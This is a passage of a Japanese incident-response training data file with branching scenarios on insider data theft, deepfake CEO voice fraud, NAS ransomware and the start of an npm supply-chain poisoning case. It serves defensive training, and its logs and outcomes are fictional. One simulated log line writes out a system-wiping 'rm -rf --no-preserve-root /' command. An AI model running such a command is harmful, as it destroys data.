        title: '私用クラウドストレージへの大容量暗号化転送の検知',
        description: '深夜02時18分、CASB/DLP（情報漏洩対策ソリューション）が発報。退職を控えたシニアエンジニアのアカウントから、コアエンジンのソースコード全Git履歴、および顧客12万件のPostgreSQLダンプ（dump_2026.sql.enc）が外部個人アカウントへ送信されています。現在転送は40%完了。',
        severity: 'critical',
        situationSummary: '本人は在宅勤務中。Slackはオフラインだが、VPN接続を通じて大量エクスポートを実行中。',
        telemetryLogs: [
          { timestamp: '02:18:12', source: 'Netskope CASB', level: 'CRITICAL', message: 'DLP Violation: Large upload to Personal Google Drive (User: s_yamada@fintech.co.jp, Volume: 18.2 / 45.0 GB)' },
          { timestamp: '02:18:45', source: 'GitLab Enterprise', level: 'WARN', message: 'Bulk repository archive download (32 private repos cloned in 10 minutes)' },
          { timestamp: '02:19:05', source: 'Postgres RDS', level: 'ALERT', message: 'pg_dump utility executed by user "yamada_admin" against production database' }
        ],
        choices: [
          {
            id: 'c1_silent_freeze_forensics',
            label: '本人の気付かぬうちにVPNセッションをサイレント切断、全特権アカウントをサスペンドし、法廷用フォレンジック保全を開始',
            actionType: 'containment',
            timeCostMinutes: 8,
            description: '転送を直ちに強制遮断。本人のアカウント（AWS, GitHub, VPN, Slack）を無効化し、社用貸与PCのリモートロックと監査ログの改ざん防止ハッシュ固定を行う。',
            tacticalRationale: '最善の法的・実務対応。本人に電話して問い詰めると「慌てて私用PCやクラウド上の証拠ファイルを完全消去」され、裁判で立証不能になるリスクを防ぐ。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -20, downtime: 0, trust: +5 },
            logOutput: [
              '[VPN] Disconnected session for user s_yamada. IP route dropped.',
              '[CASB] Google Drive upload aborted at 19.1 GB. Incomplete file cannot be extracted.',
              '[IAM/AD] Account s_yamada suspended across Okta, AWS IAM, and Active Directory.',
              '[FORENSICS] Audit logs preserved with cryptographic SHA-256 timestamping.'
            ],
            nextNodeId: 'insider_02_legal_confront'
          },
          {
            id: 'c1_phone_confront',
            label: '直ちに本人の携帯電話へ直接電話し、「今すぐアップロードを中止してデータを消せ」と問い詰める',
            actionType: 'communication',
            timeCostMinutes: 15,
            description: '深夜に直接電話して事実確認を行い、自発的な中止とデータ削除を促す。',
            tacticalRationale: '典型的な失敗例。逆上した従業員が社用PCのディスクを初期化（コマンド実行）したり、すでに上がったファイルを別クラウドへ拡散させ、証拠隠滅に走る。',
            impact: { spread: 15, exfiltration: 30, downtime: 10, trust: -25 },
            logOutput: [
              '[CALL LOG] CISO called s_yamada mobile phone.',
              '[USER REACTION] User panicked. Executed "rm -rf --no-preserve-root /" via local sudo on MacBook.',
              '[GOOGLE DRIVE] Upload continued on personal Wi-Fi device. 45GB transfer COMPLETED.'
            ],
            nextNodeId: 'insider_02_evidence_destroyed'
          }
        ]
      },

      insider_02_legal_confront: {
        id: 'insider_02_legal_confront',
        phase: 'Phase 2: 法務・人事・警察連携と機密データ回収 (T+01:00)',
        title: '不正競争防止法に基づく保全措置と競合への警告',
        description: 'セッション切断によりデータ転送は途中で頓挫。顧問弁護士と緊急協議を行い、不正競争防止法（営業秘密の不正取得・使用）に基づく証拠保全申し立て、および転職先競合企業への「営業秘密侵害の警告書（コンプライアンス通知）」の送達準備を進めます。',
        severity: 'medium',
        situationSummary: '持ち出しデータは破損（不完全）で利用不可。動かぬアクセス証跡を確保。',
        telemetryLogs: [
          { timestamp: '03:15:00', source: 'Corporate Legal', level: 'INFO', message: 'Evidence bundle ready: CASB packet logs, Postgres access times, Git clone logs.' },
          { timestamp: '03:30:00', source: 'Google Workspace API', level: 'INFO', message: 'Legal subpoena draft prepared to request deletion of partial chunk on personal Google account.' }
        ],
        choices: [
          {
            id: 'c2_legal_injunction_interview',
            label: '弁護士同席のもと本人を翌朝召集して事情聴取・誓約書徴求、警察への刑事告訴（不正競争防止法違反）',
            actionType: 'remediation',
            timeCostMinutes: 60,
            description: '確たる証拠を突きつけて個人端末上の残存データを弁護士立ち会いで完全消去。競合他社に対しても営業秘密の利用差し止めを通告する。',
            tacticalRationale: '完璧な幕引き。確固たる証拠のもとで法的措置を講じることで、機密の他社利用を確実に封じ、企業の競争力と顧客資産を防衛する。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: -15, downtime: 0, trust: +20 },
            logOutput: [
              '[LEGAL INTERVIEW] Subject admitted to breach during attorney interview.',
              '[PHYSICAL DISK] Personal storage and MacBook surrendered for bit-stream forensic imaging.',
              '[COMPETITOR] Competing firm acknowledged warning letter and rescinded employment offer.'
            ],
            nextNodeId: 'insider_03_terminal_triumph_s'
          }
        ]
      },

      insider_02_evidence_destroyed: {
        id: 'insider_02_evidence_destroyed',
        phase: 'Phase 2: 証拠隠滅後の法廷闘争と機密漏洩 (T+02:00)',
        title: '社用端末初期化と他社への機密提供',
        description: '電話で問い詰めたことにより、本人は社用端末を初期化して「誤操作であり何も盗んでいない」と主張。しかし45GBのファイルは個人PCに無事ダウンロードされており、競合他社への機密提供を止める直接的証拠の確保が難航しています。',
        severity: 'critical',
        situationSummary: 'ソースコードと顧客12万件が流出完了。証拠隠滅により刑事告訴のハードルが上昇。',
        telemetryLogs: [
          { timestamp: '04:00:00', source: 'Forensics Lab', level: 'CRITICAL', message: 'MacBook internal SSD secure-erased using APFS crypto-wipe.' },
          { timestamp: '04:30:00', source: 'Police Consultation', level: 'WARN', message: 'Difficult to prove criminal intent without intact endpoint logs.' }
        ],
        choices: [
          {
            id: 'c2b_cloud_server_logs_lawsuit',
            label: 'RDSサーバーログおよびCASBの通信記録を再構成し、民事損害賠償訴訟および仮処分を申請',
            actionType: 'communication',
            timeCostMinutes: 90,
            description: '端末側の証拠は失われたが、クラウドサーバー側のログを総動員して民事訴訟を起こす。',
            tacticalRationale: '損害は免れないが放置は許されない。数ヶ月〜数年の法廷闘争となるが、企業の知財防衛姿勢を株主と市場に示す。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 20, downtime: 20, trust: -35 },
            logOutput: [
              '[COURT] Civil lawsuit filed for 500 million yen damages under Unfair Competition Prevention Act.',
              '[MEDIA] Tech media reporting on intellectual property theft lawsuit.'
            ],
            nextNodeId: 'insider_03_terminal_lawsuit_c'
          }
        ]
      },

      insider_03_terminal_triumph_s: {
        id: 'insider_03_terminal_triumph_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】電撃的な証拠保全と営業秘密流出の完全阻止',
        description: '冷静な初動判断により、転送途中で遮断しつつ証拠ログを完全確保しました。本人による証拠隠滅を許さず、弁護士立ち会いの事情聴取で全面自白を獲得。競合への技術流出をゼロで食い止めました。',
        severity: 'contained',
        situationSummary: '機密流出: 実質ゼロ（不完全データ）。知財防衛成功。特権管理の見直し完了。',
        telemetryLogs: [
          { timestamp: '06:00:00', source: 'HR / Legal', level: 'INFO', message: 'Disciplinary dismissal completed. Zero Trust PAM policies implemented.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '内部不正対策の模範的インシデント指揮',
          summary: '「本人に気づかれずサイレントにセッション遮断」「ログの完全性確保」「不正競争防止法に即した迅速な弁護士連携」を完璧に執行しました。',
          financialEstimate: '被害損害額: 約200万円（法務・フォレンジック費用）/ 技術流出阻止価値: 約15億円以上',
          legalImpact: '営業秘密侵害差止請求の要件を完全充足。顧客情報漏洩なし。',
          complianceStatus: 'IPA 組織における内部不正防止ガイドライン 適合',
          recommendedPractices: [
            '退職予定者の特権アカウントは、退職告知の段階で権限縮小（最小権限の原則）を行う',
            'CASB/DLPによる大容量アップロードの自動ブロックポリシーを事前設定しておく',
            '内部不正の発覚時は、本人への不用意な連絡を避け、証拠保全を最優先する'
          ]
        }
      },

      insider_03_terminal_lawsuit_c: {
        id: 'insider_03_terminal_lawsuit_c',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Cランク】初動の問い詰めによる証拠隠滅と泥沼の法廷闘争',
        description: '電話で感情的に問い詰めた結果、端末を初期化されて刑事告訴の証拠が弱まりました。民事訴訟には持ち込んだものの、競合他社によるコア技術の模倣を即座に止めることができず、市場での優位性に深刻な打撃を受けました。',
        severity: 'critical',
        situationSummary: 'ソースコード流出。特許侵害・著作権侵害の長期法廷闘争へ。',
        telemetryLogs: [
          { timestamp: '08:00:00', source: 'Market Analyst', level: 'WARN', message: 'Competitor announced identical AI feature set.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'C',
          title: '初動の感情的対応が招いた証拠消失の悲劇',
          summary: '「証拠を保全してから対峙する」というフォレンジックの鉄則を怠ったことが、法的な差止請求の遅れに直結しました。',
          financialEstimate: '知財損失・訴訟費用: 約4億円以上',
          legalImpact: '長期訴訟による企業リソースの浪費。',
          complianceStatus: '内部統制上の課題',
          recommendedPractices: [
            'インシデントハンドラーは感情的にならず、客観的証拠（チェーン・オブ・カストディ）を最優先で確立する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_ai_vishing',
    title: '生成AI役員音声ディープフェイク & 極秘送金詐欺',
    subtitle: '実在モデル: 香港多国籍企業 AIディープフェイク役員ビデオ通話 38億円巨額送金詐欺事件',
    difficulty: '上級 (インシデントコマンダー)',
    category: 'AI & Social Engineering',
    estimatedTime: '12分',
    initialNodeId: 'ai_01_alert',
    initialMetrics: {
      spread: 5,
      exfiltration: 30,
      downtime: 5,
      trust: 95,
    },
    briefing: {
      targetOrganization: '東証プライム グローバル精密機械メーカー（年商2,000億円）',
      discoveredAlert: '夜間21時30分、財務統括部長の社用携帯に「代表取締役社長」からの緊急電話が着信。「極秘の欧州企業買収（M&A）のため、明朝09時までに香港の預託信託口座へ3億円を送金せよ」と社長本人の声で緊迫した指示。',
      incidentOfficer: '財務担当役員兼セキュリティコンプライアンス委員',
      immediateObjective: 'AI音声クローニング（ディープフェイク）の真偽見極め、送金プロセスの凍結、および役員音声なりすまし攻撃の封じ込め。',
    },
    imagePath: '/src/assets/images/scenario_ai_vishing_1793335053452.jpg',
    nodes: {
      ai_01_alert: {
        id: 'ai_01_alert',
        phase: 'Phase 1: 不審な役員音声着信と送金指示 (T+00:00)',
        title: '社長の肉声と口調を完全模倣した夜間緊急電話',
        description: '財務部長の社用携帯に社長からの電話着信。「明日朝イチで決済しなければ契約が破談になる。インサイダー情報のため役員会にもまだ通していない。極秘口座へ3億円を急ぎ手配しろ」と指示。声のトーン、息遣い、独特の口癖まで社長そのもの。直後に社長名義の電子署名PDFが個人LINEおよびショートメッセージ(SMS)で送られてきました。',
        severity: 'critical',
        situationSummary: '相手は社長と名乗っているが、社内正規承認ワークフローを通さず、外部チャット経由で緊急送金を要求。',
        telemetryLogs: [
          { timestamp: '21:30:15', source: 'Corporate PBX', level: 'WARN', message: 'Incoming international VoIP call with caller ID spoofed as CEO internal extension' },
          { timestamp: '21:32:00', source: 'Finance Telegram/SMS', level: 'CRITICAL', message: 'Received external message: "M&A Contract Alpha - Wire $2.0M USD to HSBC HK Acct #884-219"' },
          { timestamp: '21:33:10', source: 'Threat Intel Feed', level: 'ALERT', message: 'Active campaign: Akira/Fin7 using ElevenLabs real-time voice synthesis targeting CFOs' }
        ],
        choices: [
          {
            id: 'c1_challenge_passphrase_out_of_band',
            label: '事前設定した「役員緊急時認証コード（コールバック合言葉）」で確認し、社長の公認個人携帯へ別回線で直接折り返し電話',
            actionType: 'investigation',
            timeCostMinutes: 5,
            description: 'かかってきた電話を一旦切り、あらかじめ社内規程で定めた「別ルート（既知のプライベート直通電話）」で社長本人に直接肉声確認をとる。',
            tacticalRationale: 'AIディープフェイク対策の唯一の解。生成AIは声を完璧に模倣できても、事前に物理的に合意したオフラインの秘密合言葉や、攻撃者の通話回線外からの発信には介入できない。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: -20, downtime: 0, trust: +5 },
            logOutput: [
              '[CHALLENGE] Finance GM asked for offline executive verification keyword.',
              '[CALLER] Caller hesitated, became agitated: "What are you talking about! Just wire it now!" and hung up.',
              '[CEO DIRECT] Reached CEO at his residence on landline: CEO confirms he made NO such call. M&A is fabricated.'
            ],
            nextNodeId: 'ai_02_wire_blocked'
          },
          {
            id: 'c1_wire_now_due_to_fear',
            label: '社長の叱責を恐れ、指示に従って深夜オンラインバンキングで送金予約を入力する',
            actionType: 'remediation',
            timeCostMinutes: 20,
            description: '「社長の声なのだから間違いない」と信じ込み、明朝送金の承認処理を進めてしまう。',
            tacticalRationale: '最悪の被弾。香港の国際詐欺口座に着金した瞬間、資金は暗号資産ミキサーへ分散され、1円も回収できなくなる。',
            impact: { spread: 0, exfiltration: 50, downtime: 30, trust: -50 },
            logOutput: [
              '[BANK PORTAL] $2,000,000 USD international wire batch scheduled for 09:00 AM.',
              '[DISASTER] Funds debited automatically at bank opening.',
              '[CEO MORNING] CEO arrives at headquarters: "I never ordered any wire transfer!"'
            ],
            nextNodeId: 'ai_02_lost_funds'
          }
        ]
      },

      ai_02_wire_blocked: {
        id: 'ai_02_wire_blocked',
        phase: 'Phase 2: 全社的ディープフェイク緊急アラートと警察通報 (T+00:15)',
        title: '送金詐欺の完全阻止と経営陣へのIoC共有',
        description: '詐欺であることを確認し、送金処理を水際で完全阻止。社長の公開講演動画（YouTube上の決算説明会動画）から音声がスクレイピングされ、AIモデルで学習されていたことが判明しました。全社財務チームへの注意喚起と警察庁サイバー警察局への情報提供を行います。',
        severity: 'high',
        situationSummary: '金銭被害ゼロ。攻撃者は他部署（海外子会社の経理担当）へも同様の電話を試みている可能性あり。',
        telemetryLogs: [
          { timestamp: '21:45:00', source: 'CISO Alert', level: 'INFO', message: 'Global Finance advisory dispatched: AI Voice Cloning threat active.' },
          { timestamp: '21:50:30', source: 'National Cyber Police', level: 'INFO', message: 'Case intake complete: Bank account numbers added to international freeze list.' }
        ],
        choices: [
          {
            id: 'c2_maker_checker_protocol',
            label: '全海外拠点を含む送金プロセスへの「2名以上対面承認 (Maker-Checker方式)」のシステム的強制と音声認証の全廃',
            actionType: 'remediation',
            timeCostMinutes: 30,
            description: '「電話口の指示による送金例外」を就業規則・送金システム上で物理的に不可能にする恒久ルールを適用する。',
            tacticalRationale: '現代の決定打。声やメールを模倣されても、システム的に2名以上の独立した承認がなければ送金できないガバナンスを構築する。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: -10, downtime: 5, trust: +20 },
            logOutput: [
              '[FINANCE ERP] Rule enforced: No wire over $50k can be authorized without dual-token hardware approval.',
              '[POLICY] Verbal / telephone payment instructions strictly forbidden company-wide.',
              '[RESULT] Fraudulent attempt on European subsidiary safely deflected.'
            ],
            nextNodeId: 'ai_03_terminal_triumph_s'
          }
        ]
      },

      ai_02_lost_funds: {
        id: 'ai_02_lost_funds',
        phase: 'Phase 2: 3億円流出と国際資金追跡 (T+01:00)',
        title: '海外送金完了と資金洗浄ネットワークへの分散',
        description: '翌朝09時10分、3億円の送金が実行され、わずか15分後に香港からカンボジア、ドバイの複数のダミー法人口座を経由してビットコイン/テザー(USDT)へ変換されました。銀行に問い合わせるも「送金指図が正規手順で実行されているため巻き戻し不可」との回答。',
        severity: 'critical',
        situationSummary: '3億円の完全詐取。特別損失計上と役員責任問題。',
        telemetryLogs: [
          { timestamp: '09:25:00', source: 'HSBC HK Desk', level: 'CRITICAL', message: 'Beneficiary account emptied via ATM / OTC crypto broker.' },
          { timestamp: '09:40:00', source: 'Board of Directors', level: 'CRITICAL', message: 'Emergency board meeting convened to review 300 million yen cash loss.' }
        ],
        choices: [
          {
            id: 'c2b_interpol_crisis_pr',
            label: '国際刑事警察機構（インターポール）への資産凍結要請および適時開示（有価証券報告書修正）',
            actionType: 'communication',
            timeCostMinutes: 90,
            description: '資金回収の可能性は低いが国際捜査網に照会し、株主へ特別損失を公表する。',
            tacticalRationale: '組織としての最低限の責任。隠蔽せず公表し、内部統制の不備を認めて再発防止を図る。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 10, downtime: 30, trust: -40 },
            logOutput: [
              '[INTERPOL] Red notice filed. 2 wallets flagged on Chainalysis reactor.',
              '[TSE DISCLOSURE] Extraordinary loss of 300M JPY disclosed to Tokyo Stock Exchange.'
            ],
            nextNodeId: 'ai_03_terminal_disaster_f'
          }
        ]
      },

      ai_03_terminal_triumph_s: {
        id: 'ai_03_terminal_triumph_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】最先端AI詐欺の看破と人的防壁の勝利',
        description: '「社長の声に酷似している」という心理的バイアスに屈せず、別経路での事実確認（コールバック原則）を徹底したことで3億円の詐取を水際で完全阻止しました。全社的な二重承認ガバナンスの確立につながりました。',
        severity: 'contained',
        situationSummary: '被害額: 0円。3億円の流出阻止。次世代ソーシャルエンジニアリングを完全撃退。',
        telemetryLogs: [
          { timestamp: '11:00:00', source: 'Executive Board', level: 'INFO', message: 'Special commendation awarded to Finance GM and Incident Team.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: '生成AI時代に求められる人間の判断力の勝利',
          summary: '「声やビデオを過信しない」「別経路での二重確認」「システム的な二重承認ルール」という、最新AI詐欺に対抗する唯一無二の防衛線を完遂しました。',
          financialEstimate: '被害損害額: 0円 / 詐欺着服阻止額: 3億円',
          legalImpact: '警察庁およびサイバー犯罪対策官から国際詐欺対策の参考事例として評価。',
          complianceStatus: '内部統制最優秀',
          recommendedPractices: [
            '役員が公の場（YouTubeや記者会見）で発言した音声は誰でもAI学習できる前提で脅威モデルを組む',
            '「緊急」「極秘」「例外」を理由とする送金指示はすべて詐欺を疑い、所定の承認フローを絶対に迂回させない',
            '役員間での緊急本人確認用に、ネット非接続で合意した合言葉（マスターコード）を平時に運用する'
          ]
        }
      },

      ai_03_terminal_disaster_f: {
        id: 'ai_03_terminal_disaster_f',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Fランク】3億円の海外詐取と内部統制崩壊',
        description: '社長の偽音声に騙されて送金を実行してしまい、3億円は全額暗号資産へ洗浄されて回収不能となりました。特別損失の計上により当期赤字に転落し、財務担当役員の引責辞任と株主代表訴訟に発展しました。',
        severity: 'critical',
        situationSummary: '資金全損。社会的信用墜落。内部統制の重大な不備。',
        telemetryLogs: [
          { timestamp: '12:00:00', source: 'Auditors Report', level: 'CRITICAL', message: 'Material weakness identified in financial expenditure controls.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'F',
          title: 'AIディープフェイクによる巨額資金喪失',
          summary: '「声が本人だったから」という理由で社内規程を破り、確認を怠ったことが組織に壊滅的な金銭的・社会的損害をもたらしました。',
          financialEstimate: '金銭損失: 3億円（回収率 0%）',
          legalImpact: '金融庁への重大事故報告、株主代表訴訟、内部統制不備勧告。',
          complianceStatus: '重大な不備認定',
          recommendedPractices: [
            '「声はもはや本人証明にならない」ことを経営陣から現場まで全社員へ再教育する',
            'いかなる役員の指示であっても送金システム単独操作を物理的に不許可とする'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_nas_deadbolt',
    title: '拠点NAS一斉暗号化 & デッドボルト型ランサムウェア',
    subtitle: '実在モデル: QNAP / Synology ストレージ直接標的型ランサムウェア (Deadbolt / Qlocker) 感染事件',
    difficulty: '初級 (基礎トリアージ)',
    category: 'Ransomware',
    estimatedTime: '12分',
    initialNodeId: 'nas_01_alert',
    initialMetrics: {
      spread: 20,
      exfiltration: 5,
      downtime: 25,
      trust: 85,
    },
    briefing: {
      targetOrganization: '精密機械部品サプライヤー（国内5工場・支社）',
      discoveredAlert: '大阪工場の共有ストレージNAS（QNAP/Synology）にて、ファイル拡張子が `.deadbolt` に一括変更され、Web管理画面にビットコイン身代金要求画面が占拠。',
      incidentOfficer: '工場IT保安担当兼CSIRTメンバー',
      immediateObjective: '他拠点ストレージへの延焼阻止、本番生産ライン停止の最小化、身代金不払いでのバックアップ復旧。',
    },
    imagePath: '/src/assets/images/scenario_nas_deadbolt_1793336934539.jpg',
    nodes: {
      nas_01_alert: {
        id: 'nas_01_alert',
        phase: 'Phase 1: 共有ストレージ暗号化の覚知 (T+00:00)',
        title: 'NAS管理コンソールのDeadbolt占拠と拡張子変更',
        description: '月曜午前08時30分、工場の始業時にCAD図面フォルダーが開けないと現場から通報。NASのWeb管理ポート（8080/443）にアクセスすると「YOUR FILES HAVE BEEN LOCKED BY DEADBOLT」という要求画面が表示され、WAN側のUPnPポート開放が原因と推測されます。',
        severity: 'critical',
        situationSummary: '工場内のCAD図面30,000件が暗号化。他拠点NASとの定期レプリケーションが30分後に予定。',
        telemetryLogs: [
          { timestamp: '08:30:12', source: 'Storage Event', level: 'CRITICAL', message: 'Volume 1 encrypted. Process deadbolt executing with root privileges.' },
          { timestamp: '08:31:00', source: 'Firewall Log', level: 'WARN', message: 'Inbound connection via UPnP port forwarding (TCP 8080) from foreign IP' },
          { timestamp: '08:32:15', source: 'Cron Daemon', level: 'ALERT', message: 'Scheduled sync task "Replication_To_Headquarters" will trigger in 28 mins.' }
        ],
        choices: [
          {
            id: 'c1_sever_wan_replication',
            label: 'NASのLANケーブルを物理抜線し、拠点間ルーターでレプリケーション通信（Port 873/rsync）を緊急ドロップ',
            actionType: 'containment',
            timeCostMinutes: 5,
            description: '感染NASを即座にネットワークから物理遮断し、本社や他工場への暗号化ファイルの同期・延焼を完全に阻止する。',
            tacticalRationale: '最良の初動。レプリケーションが走ると正常なバックアップ先まで暗号化データで上書きされて全滅するため、同期遮断が最優先。',
            isOptimal: true,
            impact: { spread: -15, exfiltration: 0, downtime: 10, trust: +5 },
            logOutput: [
              '[OPS] LAN cables disconnected from Osaka-NAS-01.',
              '[ROUTER] ACL rule: Denied rsync/SMB sync between Osaka and HQ storage pool.',
              '[SOC] Replication aborted. HQ clean backup preserved.'
            ],
            nextNodeId: 'nas_02_backup_eval'
          },
          {
            id: 'c1_leave_syncing_try_decrypt',
            label: '復旧できるか試すためLANは繋いだまま、画面に表示されたメールアドレスへ連絡を取る',
            actionType: 'communication',
            timeCostMinutes: 30,
            description: '同期を停止せずに攻撃者との交渉を試みる。',
            tacticalRationale: '致命的過失。30分後に自動レプリケーションが走り、本社および他4工場のNASへ暗号化ファイルが同期され、全社的操業停止に至る。',
            impact: { spread: 50, exfiltration: 10, downtime: 60, trust: -40 },
            logOutput: [
              '[SYNC TRIGGERED] Osaka-NAS-01 synced encrypted files to HQ and Nagoya backup storage.',
              '[DISASTER] All 5 factory lines halted due to missing drawing blueprints.',
              '[THREAT ACTOR] No response from negotiation address.'
            ],
            nextNodeId: 'nas_02_catastrophic_sync'
          }
        ]
      },

      nas_02_backup_eval: {
        id: 'nas_02_backup_eval',
        phase: 'Phase 2: クリーンバックアップからのゼロ復旧 (T+00:40)',
        title: 'スナップショットおよびオフラインバックアップ検証',
        description: '感染NASの物理遮断により、他工場への同期を阻止。調査の結果、工場内NASではスナップショット機能が攻撃者により削除されていましたが、本社データセンターに前日23:59時点のイミュータブル（変更不可）バックアップが正常に保管されていることが確認されました。',
        severity: 'high',
        situationSummary: '前日時点のバックアップは無傷。工場の生産ライン復帰手順へ移行。',
        telemetryLogs: [
          { timestamp: '09:10:00', source: 'HQ Backup Vault', level: 'INFO', message: 'Immutable snapshot verified. Hash match 100% clean.' },
          { timestamp: '09:15:00', source: 'Router Config', level: 'WARN', message: 'UPnP automatic port forwarding feature found enabled on edge router.' }
        ],
        choices: [
          {
            id: 'c2_firmware_upnp_disable_restore',
            label: '全ルーターでUPnPを完全無効化・NAS初期化と最新パッチ適用・前日バックアップからリストア',
            actionType: 'remediation',
            timeCostMinutes: 90,
            description: '侵入原因であるルーターのUPnP自動開放を恒久禁止。NASをクリーン初期化してファームウェアを更新し、安全にデータを書き戻す。',
            tacticalRationale: '完璧な恒久対策。根本原因（インターネット側への意図しない管理ポート露出）を排除し、安全が確認されたバックアップから確実な操業再開を果たす。',
            isOptimal: true,
            impact: { spread: -5, exfiltration: 0, downtime: 15, trust: +15 },
            logOutput: [
              '[NETWORK] UPnP disabled globally across all 5 factory edge routers.',
              '[STORAGE] Osaka-NAS-01 factory reset and updated to latest vendor firmware.',
              '[RESTORE] 30,000 CAD blueprints restored. Production lines resumed at 13:00.'
            ],
            nextNodeId: 'nas_03_terminal_restored_s'
          }
        ]
      },

      nas_02_catastrophic_sync: {
        id: 'nas_02_catastrophic_sync',
        phase: 'Phase 2: 全社的操業停止とサプライチェーン危機 (T+01:30)',
        title: '同期による全拠点波及と納品停止危機',
        description: '暗号化ファイルが全社同期されたため、全工場の生産ラインがストップ。自動車メーカー等の納品先から部品供給遅延のペナルティ通告が相次いでいます。金庫に保管されていた先月末（25日前）の物理ハードディスクから、古い図面を取り出して手動で差分を埋める必要があります。',
        severity: 'critical',
        situationSummary: '直近25日間の設計変更データが喪失。手作業での再設計が必要。',
        telemetryLogs: [
          { timestamp: '10:00:00', source: 'Automotive Client', level: 'CRITICAL', message: 'Assembly line shutdown notice: Daily penalty $500,000 USD for supply disruption.' }
        ],
        choices: [
          {
            id: 'c2b_manual_reconstruction',
            label: '先月末の物理HDDから復元し、全設計員を招集して紙図面・メール履歴から25日分の設計差分を手動復元',
            actionType: 'remediation',
            timeCostMinutes: 240,
            description: '身代金は支払わず、極めて過酷だが確実な手動再構築で業務を再開する。',
            tacticalRationale: '苦渋の決断だが犯罪者に屈しない道。莫大な残業と遅延は生じるが、復号できるか不明な詐欺に金を払う泥沼を回避できる。',
            isOptimal: true,
            impact: { spread: 0, exfiltration: 0, downtime: 60, trust: -30 },
            logOutput: [
              '[WAR ROOM] 45 design engineers assembled for manual reconstruction.',
              '[LINE STATUS] Critical line 1 resumed at 40% capacity after 4 days.'
            ],
            nextNodeId: 'nas_03_terminal_manual_b'
          }
        ]
      },

      nas_03_terminal_restored_s: {
        id: 'nas_03_terminal_restored_s',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Sランク】電撃的な同期遮断とUPnP脆弱性排除の完全防衛',
        description: '同期が走る前に物理抜線を実施したことで本社バックアップを死守し、当日午後に全工場ラインを復帰させました。UPnPの全社廃止により再発リスクをゼロにしました。',
        severity: 'contained',
        situationSummary: '身代金支払い: ゼロ。データ損失: わずか半日分。生産復帰完了。',
        telemetryLogs: [
          { timestamp: '14:00:00', source: 'CSIRT Report', level: 'INFO', message: 'All storage endpoints audited. Zero-day UPnP exposure closed.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'S',
          title: 'ストレージ型ランサムウェアに対する迅速な物理防衛',
          summary: '「同期上書きを阻止するための即時物理切断」「イミュータブルバックアップの維持」「UPnP自動開放の無効化」というストレージ防御の三原則を完遂しました。',
          financialEstimate: '被害損害額: 約80万円（半日間の稼働ロスのみ）/ 阻止損失額: 約2億4,000万円',
          legalImpact: '社外へのデータ漏洩なし（純粋な暗号化のみ）。行政報告義務違反なし。',
          complianceStatus: '事業継続計画 (BCP) 実効性認定',
          recommendedPractices: [
            'ルーターのUPnP（Universal Plug and Play）は外部から勝手にポート開放されるため全社で無効化する',
            'ストレージのバックアップは、書き換え不可（Object Lock / WORM）の世代管理を採用する',
            '同期タスクは異常検知時に自動停止するスクリプトを組み込む'
          ]
        }
      },

      nas_03_terminal_manual_b: {
        id: 'nas_03_terminal_manual_b',
        phase: '訓練終了: 事後評価 (After Action Review)',
        title: '【Bランク】同期波及の打撃と過酷な手作業再建',
        description: '初動の判断遅延で全社同期を許してしまいましたが、身代金は支払わずにオフラインデータと紙図面から徹夜で再建しました。納品遅延ペナルティは発生したものの、反社会勢力への利益供与は阻止しました。',
        severity: 'medium',
        situationSummary: '4日間の稼働停止。サプライヤー信頼度の低下。',
        telemetryLogs: [
          { timestamp: '18:00:00', source: 'Factory Ops', level: 'WARN', message: 'Normal delivery cadence expected to recover in 3 weeks.' }
        ],
        choices: [],
        isTerminal: true,
        terminalOutcome: {
          grade: 'B',
          title: '初動同期ミスの重い代償と不屈の再建',
          summary: 'レプリケーションの停止を怠った代償として全社停止を招いたものの、バックアップの多重化（オフライン保管）が辛うじて組織を救いました。',
          financialEstimate: '被害損害額: 約6,800万円（納品遅延ペナルティ・再設計人件費）',
          legalImpact: '契約遅延責任に関する取引先協議。',
          complianceStatus: '要改善',
          recommendedPractices: [
            '「暗号化を見たら直ちに同期を切る」手順を全現場マニュアルの最上位に太字で記載する'
          ]
        }
      }
    }
  },

  {
    id: 'scenario_npm_malware',
    title: 'OSS依存パッケージ毒入れ & ビルド環境Secrets強奪',
    subtitle: '実在モデル: xz-utils バックドア / event-stream 等のOSS依存関係毒入れ & CI/CDシークレット漏洩事件',
    difficulty: '中級 (実務CSIRT)',
    category: 'Cloud & Supply Chain',
    estimatedTime: '15分',
    initialNodeId: 'npm_01_alert',
    initialMetrics: {
      spread: 15,
      exfiltration: 30,
      downtime: 10,
      trust: 90,
    },
    briefing: {
      targetOrganization: 'Web3 & モバイル決済プラットフォーム開発企業（MAU 250万人）',
      discoveredAlert: 'フロントエンドビルドで使用しているユーティリティパッケージ（`event-stream-helper`）がGitHub Actionsパイプライン上で実行された際、環境変数（ENV）を不審な外部ドメインへPOST送信しているのを検知。',
      incidentOfficer: 'アプリケーションセキュリティリード',
      immediateObjective: '毒入れパッケージのビルド停止、漏洩した本番APIキー・決済暗号化シークレットの即時ローテーション、悪意あるコードのユーザー配信阻止。',
    },
    imagePath: '/src/assets/images/scenario_npm_malware_1793336934905.jpg',
    nodes: {
      npm_01_alert: {
        id: 'npm_01_alert',
        phase: 'Phase 1: CI/CDパイプラインでの異常外向き通信検知 (T+00:00)',
        title: 'ビルドスクリプト（postinstall）による環境変数持ち出し',
